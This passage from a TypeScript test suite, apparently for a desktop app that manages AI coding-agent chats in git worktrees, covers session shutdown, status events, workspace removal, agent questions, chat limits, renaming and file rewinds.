    it('gives up on a session that will not close, rather than holding the app open', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      // Never resolves, which is the case the ceiling exists for.
      usageAnswer = () => new Promise(() => undefined)
      agent().emit(resultMessage)

      const started = Date.now()
      await expect(service.closeChats()).resolves.toBeUndefined()

      expect(Date.now() - started).toBeLessThan(SHUTDOWN_GRACE_MS * 4)
    })

    it('has nothing to do when no session was ever started', async () => {
      const { service } = await withWorkspace()

      await expect(service.closeChats()).resolves.toBeUndefined()
    })

    /*
     * The list draws this, and several workspaces work at once — so what one is
     * doing has to reach the window without the list asking git about every
     * workspace of every project to find out.
     */
    it('says when a workspace starts working, and when it stops', async () => {
      const { service, workspaceId } = await withWorkspace()
      const seen: WorkspaceStatusEvent[] = []
      service.onWorkspaceStatus((event) => seen.push(event))

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      expect(seen).toEqual([{ workspaceId, status: 'running' }])

      await service.interruptChat(chat.id)
      expect(seen).toEqual([
        { workspaceId, status: 'running' },
        { workspaceId, status: 'idle' }
      ])
    })

    // An unchanged commit would otherwise send an event describing nothing, on
    // a stream the list re-renders from.
    it('says nothing when the status has not moved', async () => {
      const { service, workspaceId } = await withWorkspace()
      const seen: WorkspaceStatusEvent[] = []
      service.onWorkspaceStatus((event) => seen.push(event))

      const chat = await service.openChat(workspaceId)
      await service.interruptChat(chat.id)

      expect(seen).toEqual([])
    })

    it('stops sending status once the listener has unsubscribed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const seen: WorkspaceStatusEvent[] = []
      const unsubscribe = service.onWorkspaceStatus((event) => seen.push(event))
      unsubscribe()

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      expect(seen).toEqual([])
    })

    it('stops sending events once the listener has unsubscribed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const seen: ChatEvent[] = []
      const unsubscribe = service.onAgentEvent((event) => seen.push(event))

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      unsubscribe()
      agent().emit(textMessage('done'))

      await vi.waitFor(async () => {
        await expect(service.chatHistory(chat.id)).resolves.toHaveLength(2)
      })
      expect(seen).toEqual([])
    })

    // The worktree is about to stop existing, and a live agent would keep a
    // child process pointed at a path that is no longer there.
    it('closes the session and discards the history when the workspace goes', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.removeWorkspaceById(workspaceId, { force: true })

      expect(agent().closed()).toBe(1)
      await expect(service.chatHistory(chat.id)).resolves.toEqual([])
    })

    /*
     * The mirror of the test above, and the ordinary path rather than the
     * exotic one: the pane pre-ticks the branch checkbox and only forces when
     * the worktree is dirty, so a clean workspace whose commits are not merged
     * refuses every time. Cancelling must cost nothing — the refusal has to
     * happen before the sessions close and before the cleanup runs.
     */
    it('keeps the conversation and runs no cleanup when the removal is refused', async () => {
      const repo = join(dir, 'planner')
      await initRepo(repo)

      const service = await createService({
        ...paths(dir),
        query: fakeQuery(),
        makeGh: () => () => Promise.reject(new Error('gh: not logged in'))
      })
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)

      const marker = join(dir, 'cleaned.txt')
      await service.saveProjectScript(
        project.id,
        'archive',
        `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
      )

      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'work')

      await writeFile(join(workspace.path, 'work.txt'), 'work\n', 'utf8')
      await run('git', ['add', '.'], { cwd: workspace.path })
      await run('git', ['commit', '-q', '-m', 'never merged'], { cwd: workspace.path })

      await expect(
        service.removeWorkspaceById(workspace.id, { deleteBranch: true })
      ).rejects.toMatchObject({ code: 'branchUnmerged' })

      await expect(service.chatHistory(chat.id)).resolves.toHaveLength(1)
      expect(agent().closed()).toBe(0)
      await expect(access(marker)).rejects.toThrow()
      await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(1)
    })

    /*
     * The other half. Once the guards have passed there is still one way to
     * fail — git refusing the worktree — and the records survive that, because
     * the commit is never reached. The history has to survive with them, which
     * is why it is discarded after the commit rather than before the guards.
     */
    it('keeps the history when the worktree cannot be discarded', async () => {
      const repo = join(dir, 'planner')
      await initRepo(repo)

      const service = await createService({
        ...paths(dir),
        query: fakeQuery(),
        makeExec: (cwd, options) => {
          const exec = gitIn(cwd, options)
          return async (args) =>
            args[0] === 'worktree' && args[1] === 'remove'
              ? Promise.reject(new Error('fatal: validation failed, cannot remove working tree'))
              : exec(args)
        }
      })
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)

      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'work')

      await expect(service.removeWorkspaceById(workspace.id, { force: true })).rejects.toThrow()

      await expect(service.chatHistory(chat.id)).resolves.toHaveLength(1)
      await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(1)
    })

    // A closing session goes on emitting for a moment. Writing the transcript
    // back then would leave a file nothing in the state points at.
    it('ignores events that arrive after the workspace is gone', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.removeWorkspaceById(workspaceId, { force: true })

      agent().emit(initMessage)
      agent().emit(textMessage('too late'))
      // Its status has nowhere to be written either.
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'result')).toBe(true)
      })
      await expect(service.chatHistory(chat.id)).resolves.toEqual([])
    })

    // Neither failure is a reason to keep a workspace the user asked to be rid
    // of: the records go either way, and a session that will not die is not
    // something removing a directory can fix.
    it('removes the workspace even when the session and the history resist', async () => {
      const repo = join(dir, 'planner')
      await initRepo(repo)

      const stubborn: QueryFn = () =>
        Object.assign(silence(), {
          interrupt: () => Promise.resolve(undefined),
          setPermissionMode: () => Promise.resolve(),
          applyFlagSettings: () => Promise.resolve(),
          setModel: () => Promise.resolve(),
          supportedModels: () => Promise.resolve([]),
          getContextUsage: () => Promise.reject(new Error('no session')),
          usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET: () =>
            Promise.reject(new Error('no session')),
          close: () => {
            throw new Error('the process would not die')
          }
        }) as unknown as Query

      const service = await createService({ ...paths(dir), query: stubborn })
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)
      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'work')

      // The transcript directory becomes a file, so deleting the history in it
      // fails as well.
      await rm(join(dir, 'data', 'chats'), { recursive: true, force: true })
      await writeFile(join(dir, 'data', 'chats'), 'not a directory', 'utf8')

      await expect(
        service.removeWorkspaceById(workspace.id, { force: true })
      ).resolves.toBeUndefined()
      expect(service.listChats(workspace.id)).toEqual([])
    })

    it('takes the chats of a project with it', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.removeProjectById(projectId)

      expect(service.listChats(workspaceId)).toEqual([])
    })

    /*
     * The records going was all this used to assert, which is why the sessions
     * staying went unnoticed. A leaked agent is not idle: it holds a child
     * process whose working directory has just been deleted underneath it, and
     * nothing in the interface can reach it again.
     */
    it('ends the sessions of every workspace it takes', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.removeProjectById(projectId)

      expect(agent().closed()).toBe(1)
    })
  })

  /** Waits for the request the agent is blocked on and answers with its id. */
  /*
   * The questions the agent asks.
   *
   * They arrive as an ordinary permission request — `AskUserQuestion` is a tool
   * like any other — but the answer is not allow or deny. The user's choices go
   * back as a modified copy of the tool's own arguments, which is the only way
   * a tool that asked something gets to hear it.
   */
  describe('the questions the agent asks', () => {
    const ASKED = {
      questions: [
        {
          question: 'Which library should we use?',
          header: 'Library',
          multiSelect: false,
          options: [
            { label: 'date-fns', description: '' },
            { label: 'Luxon', description: '' }
          ]
        }
      ]
    }

    /** A chat with a question open, and the promise the tool call is holding. */
    async function withQuestion(): Promise<{
      service: OctopusService
      chatId: string
      requestId: string
      decision: Promise<unknown>
      events: ChatEvent[]
    }> {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'which one?')

      const decision = agent().ask('AskUserQuestion', ASKED)
      return { service, chatId: chat.id, requestId: await waitForRequest(events), decision, events }
    }

    it('hands the tool the answers, written into its own arguments', async () => {
      const { service, requestId, decision } = await withQuestion()

      await service.answerQuestions(requestId, [
        { question: 'Which library should we use?', selected: ['Luxon'], other: null }
      ])

      await expect(decision).resolves.toMatchObject({
        behavior: 'allow',
        updatedInput: { answers: { 'Which library should we use?': 'Luxon' } }
      })
    })

    // What the card is redrawn from after a restart: the tool call holds the
    // questions as they were before anyone answered, and the tool's own result
    // is a sentence of prose.
    it('writes down what was chosen', async () => {
      const { service, chatId, requestId } = await withQuestion()

      await service.answerQuestions(requestId, [
        { question: 'Which library should we use?', selected: ['Luxon'], other: 'or Temporal' }
      ])

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chatId)
        expect(
          history.some(
            (entry) => entry.role === 'agent' && entry.event.type === 'question_answered'
          )
        ).toBe(true)
      })
    })

    // Already answered — by the other window, most likely — or the session it
    // belonged to is gone.
    it('ignores an answer to a question nobody is waiting on', async () => {
      const { service } = await withWorkspace()

      await expect(service.answerQuestions('r-nothing', [])).resolves.toBeUndefined()
    })

    /*
     * Something that is not a question has to stay answerable by the card that
     * can answer it. Answered blind here, an `Edit` would be approved by a
     * window that never showed anyone the file.
     */
    it('leaves a request that is not a question alone', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit', { file_path: '/a.rb' })
      const requestId = await waitForRequest(events)

      await service.answerQuestions(requestId, [])

      expect(service.pendingPermissions(chat.id)[0]?.requestId).toBe(requestId)

      // Answered properly before the test ends, so the tool call is not left
      // holding a promise while the temporary directory is being removed.
      await service.answerPermission(requestId, 'deny')
      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
    })

    /*
     * Skipping is the ordinary approval, and it has to stay that way: the tool
     * then runs with its arguments untouched, and the agent reads that nobody
     * answered — which is its cue to ask again rather than to guess.
     */
    it('leaves the arguments untouched when the question is skipped', async () => {
      const { service, requestId, decision } = await withQuestion()

      await service.answerPermission(requestId, 'allow')

      await expect(decision).resolves.toMatchObject({
        behavior: 'allow',
        updatedInput: ASKED
      })
      expect(await decision).not.toHaveProperty('updatedInput.answers')
    })

    // A question nobody can answer is withdrawn like any other request: the
    // turn it belonged to is over, and the card has nothing behind it.
    it('withdraws an unanswered question when the turn is stopped', async () => {
      const { service, chatId, decision } = await withQuestion()

      await service.interruptChat(chatId)

      await expect(decision).resolves.toMatchObject({ behavior: 'deny', message: ABANDONED })
    })
  })

  describe('a second conversation in the same workspace', () => {
    it('is created beside the first, in the order they were opened', async () => {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      expect(second.id).not.toBe(first.id)
      expect(service.listChats(workspaceId).map((chat) => chat.id)).toEqual([first.id, second.id])
    })

    it('starts from the settings a first conversation would', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ workingMode: 'acceptEdits', effort: 'high' })

      const created = await service.createChat(workspaceId)

      expect(created.workingMode).toBe('acceptEdits')
      expect(created.effort).toBe('high')
      expect(created.status).toBe('idle')
    })

    it('refuses a fourth', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)
      await service.createChat(workspaceId)
      await service.createChat(workspaceId)

      await expect(service.createChat(workspaceId)).rejects.toMatchObject({
        name: 'ChatError',
        code: 'tooManyChats',
        params: { limit: '3' }
      })
      expect(service.listChats(workspaceId)).toHaveLength(3)
    })

    /*
     * The cap is counted inside the commit, for the reason `openChat` decides
     * inside its own: two presses of the new-tab button landing together would
     * both see room against two conversations, and it would hold for neither.
     */
    it('holds the cap when two requests land together', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.openChat(workspaceId)
      await service.createChat(workspaceId)

      const [one, other] = await Promise.allSettled([
        service.createChat(workspaceId),
        service.createChat(workspaceId)
      ])

      expect([one.status, other.status].sort()).toEqual(['fulfilled', 'rejected'])
      expect(service.listChats(workspaceId)).toHaveLength(3)
    })

    it('refuses a workspace that is not there', async () => {
      const { service } = await withWorkspace()

      await expect(service.createChat('planner/nowhere')).rejects.toBeInstanceOf(WorkspaceError)
    })
  })

  describe('what each conversation is doing', () => {
    /** Two conversations in one workspace, the first of them with a session. */
    async function withTwoChats(): Promise<{
      service: OctopusService
      workspaceId: string
      first: string
      second: string
      statuses: ChatStatusEvent[]
      workspaces: WorkspaceStatusEvent[]
    }> {
      const { service, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      const statuses: ChatStatusEvent[] = []
      const workspaces: WorkspaceStatusEvent[] = []
      service.onChatStatus((event) => statuses.push(event))
      service.onWorkspaceStatus((event) => workspaces.push(event))

      return { service, workspaceId, first: first.id, second: second.id, statuses, workspaces }
    }

    /*
     * A second window on the same workspace reads its list once and then draws
     * whatever was true when it opened: a tab it never sees created, and one it
     * goes on drawing after the other window closed it.
     *
     * Announced from `commitChats` rather than from each writer. There are five
     * of them — open, create, fork, rename, close — and a hand-kept list of call
     * sites is what a sixth writer silently falls off.
     */
    describe('when the conversations of a workspace change', () => {
      async function watching(): Promise<{
        service: OctopusService
        workspaceId: string
        first: string
        changes: ChatsChangedEvent[]
      }> {
        const { service, workspaceId } = await withWorkspace()
        const first = await service.openChat(workspaceId)

        const changes: ChatsChangedEvent[] = []
        service.onChatsChanged((event) => changes.push(event))

        return { service, workspaceId, first: first.id, changes }
      }

      it('says so when one is opened, created and closed', async () => {
        const { service, workspaceId } = await withWorkspace()
        const changes: ChatsChangedEvent[] = []
        service.onChatsChanged((event) => changes.push(event))

        const first = await service.openChat(workspaceId)
        expect(changes).toEqual([{ workspaceId }])

        const second = await service.createChat(workspaceId)
        expect(changes).toHaveLength(2)

        await service.closeChat(second.id)
        expect(changes).toHaveLength(3)
        expect(service.listChats(workspaceId).map((chat) => chat.id)).toEqual([first.id])
      })

      // The name is what the strip draws, so a window that did not rename it
      // still has to redraw.
      it('says so when one is renamed', async () => {
        const { service, first, changes } = await watching()

        await service.renameChat(first, 'the migration')

        expect(changes).toHaveLength(1)
      })

      /*
       * The assertion this whole design is for. A status moves several times a
       * turn and goes through the same funnel, so a membership reading that
       * included statuses would tell every window to re-read its list on every
       * one of them — which is the reason the status stream stays a status.
       */
      it('says nothing when a conversation only changes what it is doing', async () => {
        const { service, workspaceId, first, changes } = await watching()

        await service.sendToChat(first, 'go')
        // The status did move, so this is the funnel firing and the membership
        // reading declining to — not the funnel never being reached.
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')

        expect(changes).toEqual([])
      })

      // A second call opens nothing: the record is already there, so the set is
      // where it was and there is nothing for a window to redraw.
      it('says nothing when opening finds the conversation already there', async () => {
        const { service, workspaceId, changes } = await watching()

        await service.openChat(workspaceId)

        expect(changes).toEqual([])
      })

      it('drops a subscriber that has gone', async () => {
        const { service, workspaceId } = await watching()
        const seen: ChatsChangedEvent[] = []
        const stop = service.onChatsChanged((event) => seen.push(event))

        stop()
        await service.createChat(workspaceId)

        expect(seen).toEqual([])
      })
    })

    // Every subscriber is dropped when its window closes; one left behind
    // would go on being handed events for a pane that no longer exists.
    it('stops announcing to a listener that has unsubscribed', async () => {
      const { service, first, statuses } = await withTwoChats()
      const seen: ChatStatusEvent[] = []
      const stop = service.onChatStatus((event) => seen.push(event))

      stop()
      await service.sendToChat(first, 'go')

      expect(seen).toEqual([])
      expect(statuses).toHaveLength(1)
    })

    it('moves only the conversation that sent a message', async () => {
      const { service, workspaceId, first, second } = await withTwoChats()

      await service.sendToChat(first, 'go')

      const chats = service.listChats(workspaceId)
      expect(chats.find((chat) => chat.id === first)?.status).toBe('running')
      expect(chats.find((chat) => chat.id === second)?.status).toBe('idle')
    })

    it('announces the conversation and the workspace it moved', async () => {
      const { service, workspaceId, first, statuses, workspaces } = await withTwoChats()

      await service.sendToChat(first, 'go')

      expect(statuses).toEqual([
        {
          chatId: first,
          workspaceId,
          status: 'running',
          interrupted: false,
          turnStartedAt: expect.any(String)
        }
      ])
      expect(workspaces).toEqual([{ workspaceId, status: 'running' }])
    })

    /*
     * A turn the application's exit cut off comes back `idle`, which the list
     * draws as finished — so it comes back marked as cut off instead, and that
     * lasts until a session speaks for the conversation again. The window
     * copies the flag from the status event rather than working the rule out
     * for itself, so the event has to carry it.
     */
    describe('a turn the application quit in the middle of', () => {
      async function quitMidTurn(): Promise<{
        reopened: OctopusService
        workspaceId: string
        chatId: string
      }> {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'go')
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')

        const reopened = await createService({ ...paths(dir), query: fakeQuery() })
        return { reopened, workspaceId, chatId: chat.id }
      }

      it('comes back interrupted rather than finished', async () => {
        const { reopened, workspaceId } = await quitMidTurn()

        expect(reopened.listChats(workspaceId)[0]).toMatchObject({
          status: 'idle',
          interrupted: true
        })
      })

      it('stops being interrupted once a turn starts, and says so', async () => {
        const { reopened, workspaceId, chatId } = await quitMidTurn()
        const statuses: ChatStatusEvent[] = []
        reopened.onChatStatus((event) => statuses.push(event))

        await reopened.sendToChat(chatId, 'carry on')

        expect(reopened.listChats(workspaceId)[0]?.interrupted).toBe(false)
        expect(statuses).toEqual([
          expect.objectContaining({ status: 'running', interrupted: false })
        ])
      })

      // The end of the next turn is a move like any other; what it must not do
      // is bring back a flag that belonged to the one before.
      it('stays clear when that turn ends', async () => {
        const { reopened, workspaceId, chatId } = await quitMidTurn()

        await reopened.sendToChat(chatId, 'carry on')
        // The reopened service's session, not the one the quit left behind.
        agents.at(-1)?.emit(resultMessage)
        await vi.waitFor(() => {
          expect(reopened.listChats(workspaceId)[0]?.status).toBe('idle')
        })

        expect(reopened.listChats(workspaceId)[0]?.interrupted).toBe(false)
      })
    })

    /*
     * The status bar counts a turn for conversations whose logs no window has
     * loaded, so the start travels with the status — and it must be the moment
     * the working line counts from: the prompt, not the latest event.
     */
    it('says when the turn began, and forgets it once the turn is over', async () => {
      let clock = '2026-10-20T09:00:00.000Z'
      const { service, projectId, workspaceId } = await withWorkspace({ now: () => clock })
      const chat = await service.openChat(workspaceId)
      const statuses: ChatStatusEvent[] = []
      service.onChatStatus((event) => statuses.push(event))

      await service.sendToChat(chat.id, 'go')
      clock = '2026-10-20T09:03:00.000Z'
      agent().emit(textMessage('working on it'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).toHaveLength(2)
      })

      expect(statuses[0]?.turnStartedAt).toBe('2026-10-20T09:00:00.000Z')
      const [view] = await service.listWorkspaces(projectId)
      expect(view?.chats[0]?.turnStartedAt).toBe('2026-10-20T09:00:00.000Z')

      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(statuses.at(-1)).toMatchObject({ status: 'idle', turnStartedAt: null })
      })
    })

    /*
     * The regression this whole arrangement exists to prevent. The workspace's
     * status used to be written by whichever conversation had an event, so the
     * one that finished reported the others idle — and took the stop button
     * away from turns that were still running.
     */
    it('leaves the workspace running when one of two conversations finishes', async () => {
      const { service, workspaceId, first, second, workspaces } = await withTwoChats()

      await service.sendToChat(first, 'go')
      await service.sendToChat(second, 'go too')

      const [firstAgent, secondAgent] = agents
      secondAgent?.emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId).find((chat) => chat.id === second)?.status).toBe(
          'idle'
        )
      })

      expect(service.listChats(workspaceId).find((chat) => chat.id === first)?.status).toBe(
        'running'
      )
      expect(workspaces.filter((event) => event.status === 'idle')).toEqual([])

      firstAgent?.finish()
    })

    // The workspace's own value only changes when the aggregate does, or every
    // turn in a busy workspace would redraw the whole list for nothing.
    it('says nothing about the workspace when the aggregate has not moved', async () => {
      const { service, workspaceId, first, second, workspaces } = await withTwoChats()

      await service.sendToChat(first, 'go')
      await service.sendToChat(second, 'go too')

      expect(workspaces).toEqual([{ workspaceId, status: 'running' }])
    })

    it('stops only the conversation that was interrupted', async () => {
      const { service, workspaceId, first, second } = await withTwoChats()

      await service.sendToChat(first, 'go')
      await service.sendToChat(second, 'go too')
      await service.interruptChat(second)

      const chats = service.listChats(workspaceId)
      expect(chats.find((chat) => chat.id === first)?.status).toBe('running')
      expect(chats.find((chat) => chat.id === second)?.status).toBe('idle')
    })

    // A closing session goes on emitting for a moment after its conversation
    // was closed, and there is nothing left to record it against.
    it('ignores an event for a conversation that has gone', async () => {
      const { service, workspaceId, first, second, statuses } = await withTwoChats()

      await service.sendToChat(first, 'go')
      await service.closeChat(first)
      statuses.length = 0

      agent().emit(resultMessage)
      await new Promise((resolve) => setTimeout(resolve, 10))

      expect(statuses).toEqual([])
      expect(service.listChats(workspaceId).map((chat) => chat.id)).toEqual([second])
    })
  })

  /*
   * The sidebar draws one dot per conversation, and it draws them from what
   * `listWorkspaces` answers. Every other test here reads `listChats`, which
   * goes nowhere near the view the list is actually built from.
   */
  describe('what the workspace list says about the conversations', () => {
    it('reports each of them, with what it is doing', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.renameChat(second.id, 'auth refactor')
      await service.sendToChat(first.id, 'go')

      const [view] = await service.listWorkspaces(projectId)

      /*
       * Neither has `started` yet, the one being worked in included: the id
       * arrives as an `init` event of the agent's own and this fake sends none.
       * Which is the honest order — a turn is under way before the session it
       * runs in has announced itself, and `running` is what the list draws
       * meanwhile.
       */
      expect(view?.chats).toEqual([
        {
          id: first.id,
          agent: 'claude',
          title: null,
          status: 'running',
          started: false,
          interrupted: false,
          turnStartedAt: expect.any(String)
        },
        {
          id: second.id,
          agent: 'claude',
          title: 'auth refactor',
          status: 'idle',
          started: false,
          interrupted: false,
          turnStartedAt: null
        }
      ])
    })

    it('reports none for a workspace nobody has spoken to', async () => {
      const { service, projectId } = await withWorkspace()

      const [view] = await service.listWorkspaces(projectId)

      expect(view?.chats).toEqual([])
    })

    it('drops a conversation that was closed', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)

      await service.closeChat(second.id)
      const [view] = await service.listWorkspaces(projectId)

      expect(view?.chats.map((chat) => chat.id)).toEqual([first.id])
    })
  })

  describe('naming a conversation', () => {
    it('keeps the name it was given', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.renameChat(chat.id, 'auth refactor')

      expect(service.listChats(workspaceId)[0]?.title).toBe('auth refactor')
    })

    it('trims what it is handed, so a name of spaces is not a gap', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.renameChat(chat.id, '  auth refactor  ')

      expect(service.listChats(workspaceId)[0]?.title).toBe('auth refactor')
    })

    /*
     * Not a refusal but a request: the conversation goes back to being named
     * after its agent and its place, the way clearing a project's icon puts the
     * initials back.
     */
    it('takes the name back when handed an empty one', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.renameChat(chat.id, 'auth refactor')

      await service.renameChat(chat.id, '   ')

      expect(service.listChats(workspaceId)[0]?.title).toBeNull()
    })

    it('survives a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.renameChat(chat.id, 'auth refactor')

      const reopened = await createService({ ...paths(dir), query: fakeQuery() })

      expect(reopened.listChats(workspaceId)[0]?.title).toBe('auth refactor')
    })

    it('refuses an id nothing answers to', async () => {
      const { service } = await withWorkspace()

      await expect(service.renameChat('chat-nowhere', 'x')).rejects.toBeInstanceOf(WorkspaceError)
    })
  })

  describe('putting the files back to a message', () => {
    /**
     * What the agent CLI holds of the session, as a rewind reads it back.
     *
     * Every user message this conversation recorded, each after an answer of
     * its own, so a cut always has an entry to fall on — which is how a real
     * chain reads. Replaced by a test that wants another history.
     */
    let sessionChain: (sessionId: string) => Promise<unknown>
    /** Every fork asked for, with what it was asked to keep. */
    let forks: { sessionId: string; upToMessageId: string | undefined }[]

    beforeEach(() => {
      sessionChain = () => Promise.resolve([])
      forks = []
    })

    /** The chain for these messages, the way the CLI writes one. */
    function chainOf(...messageIds: string[]): { type: string; uuid: string }[] {
      return messageIds.flatMap((id, index) => [
        { type: 'user', uuid: id },
        { type: 'assistant', uuid: `answer-${String(index + 1)}` }
      ])
    }

    /** A conversation that has spoken once and finished, so it has a session. */
    async function spoken(): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
      messageId: string
      events: ChatEvent[]
    }> {
      const { service, workspaceId, events } = await withWorkspace({
        sessionMessages: (sessionId) => sessionChain(sessionId),
        forkSession: (sessionId, options) => {
          forks.push({ sessionId, upToMessageId: options.upToMessageId })
          return Promise.resolve({ sessionId: 'sess-forked' })
        }
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'rename the helper')
      agent().emit(initMessage)
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]).toMatchObject({
          sessionId: 'sess-1',
          status: 'idle'
        })
      })

      const [entry] = await service.chatHistory(chat.id)
      const messageId = entry?.role === 'user' ? (entry.uuid ?? '') : ''
      sessionChain = () => Promise.resolve(chainOf(messageId))
      return { service, workspaceId, chatId: chat.id, messageId, events }
    }

    /**
     * A conversation of two finished turns, the second the one to rewind to —
     * so the cut falls on the first turn's answer and something is kept.
     */
    async function spokenTwice(): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
      first: string
      second: string
      events: ChatEvent[]
    }> {
      const { service, workspaceId, chatId, messageId: first, events } = await spoken()
      await service.sendToChat(chatId, 'now rename the test too')
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      const history = await service.chatHistory(chatId)
      const last = history.findLast((entry) => entry.role === 'user')
      const second = last?.role === 'user' ? (last.uuid ?? '') : ''
      sessionChain = () => Promise.resolve(chainOf(first, second))
      return { service, workspaceId, chatId, first, second, events }
    }

    /** The texts of what the user said, as the history now holds them. */
    async function saidIn(service: OctopusService, chatId: string): Promise<string[]> {
      return (await service.chatHistory(chatId)).flatMap((entry) =>
        entry.role === 'user' ? [entry.text] : []
      )
    }

    // The id the agent will know the message by is the only handle on that
    // point, and nothing in the stream says it back — so it is made here and
    // written down with the message.
    it('gives each message an id and keeps it with the message', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      const answered = await service.sendToChat(chat.id, 'first')

      const [recorded] = await service.chatHistory(chat.id)
      expect(recorded).toMatchObject({ role: 'user', uuid: expect.any(String) })
      expect(agent().sentIds).toEqual([recorded?.role === 'user' ? recorded.uuid : null])
      // And says it back: the window has drawn the message already, and without
      // the id its line could not be rewound until the history was read again.
      expect(answered).toBe(recorded?.role === 'user' ? recorded.uuid : 'not a user entry')
    })

    it('asks the agent to checkpoint files at all', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'go')

      expect(agent().options()).toMatchObject({ enableFileCheckpointing: true })
    })

    // Asked before the real thing, so the user can be told how much it undoes.
    it('says what a rewind would do without doing it', async () => {
      const { service, chatId, messageId } = await spoken()

      await expect(service.previewRewind(chatId, messageId)).resolves.toMatchObject({
        conversation: true,
        files: { canRewind: true, filesChanged: ['a.ts', 'b.ts'], insertions: 12, deletions: 4 }
      })

      expect(agent().rewinds()).toEqual([{ messageId, dryRun: true }])
    })

    it('puts the files back and records that it did', async () => {
      const { service, chatId, messageId } = await spoken()

      await expect(service.rewindChat(chatId, messageId, 'files')).resolves.toMatchObject({
        files: { filesChanged: ['a.ts', 'b.ts'] },
        text: null
      })

      expect(agent().rewinds()).toEqual([{ messageId, dryRun: false }])
      // In the log as well, because it changed the tree without the agent
      // doing anything — read back later it would otherwise be unexplained.
      await vi.waitFor(async () => {
        const history = await service.chatHistory(chatId)
        expect(history.at(-1)).toMatchObject({
          role: 'agent',
          event: { type: 'files_rewound', messageId, files: 2, insertions: 12, deletions: 4 }
        })
      })
    })

    // Watched on the event stream rather than read back from disk: the log is
    // written in the background, so reading it straight after sees nothing
    // either way, and a sleep makes the test about the clock.
    it('writes nothing to the log for a preview', async () => {
      const { service, chatId, messageId } = await spoken()
      const rewound: ChatEvent['event'][] = []
      service.onAgentEvent((entry) => {
        if (entry.event.type === 'files_rewound') rewound.push(entry.event)
      })

      await service.previewRewind(chatId, messageId)
      expect(rewound).toEqual([])

      await service.rewindChat(chatId, messageId, 'files')
      expect(rewound).toHaveLength(1)
    })

    // A rewind under a running agent is a race for the same files.
    it('refuses while a turn is running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'go')
      agent().emit(initMessage)
      const [entry] = await service.chatHistory(chat.id)
      const messageId = entry?.role === 'user' ? (entry.uuid ?? '') : ''

      // Either half: the conversation is being added to, and its files edited.
      for (const scope of ['files', 'conversation'] as const) {
        await expect(service.rewindChat(chat.id, messageId, scope)).rejects.toMatchObject({
          name: 'ChatError',
          code: 'rewindBusy'
        })
      }
